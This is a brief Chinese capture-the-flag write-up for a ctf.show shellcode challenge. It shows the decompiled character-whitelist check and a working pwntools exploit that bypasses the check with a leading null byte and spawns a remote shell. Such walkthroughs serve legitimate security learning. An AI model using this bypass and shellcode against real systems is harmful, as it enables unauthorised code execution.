# 挑战简介
简单的shellcode？不对劲，十分得有十二分的不对劲

# 思路
观看check函数  
```
signed __int64 __fastcall check(_BYTE *a1)
{
  _BYTE *j; // [rsp+18h] [rbp-10h]
  _BYTE *i; // [rsp+20h] [rbp-8h]

  for ( i = a1; *i; ++i )
  {
    for ( j = &unk_400F20; *j && *j != *i; ++j )
      ;
    if ( !*j )
      return 0LL;
  }
  return 1LL;
}
```

很明显，检查你输入的shellcode是否在字符集内  
但是我们最主要要做的，还是绕过检查

有没有以\x00开头的shellcode呢？  

有的  
```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='amd64', log_level='debug')

p = remote("pwn.challenge.ctf.show",28292)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.sh())

pass_ = b'\x00\xc0' 

payload = pass_ + shellcode

p.sendline(payload)

p.interactive()

```
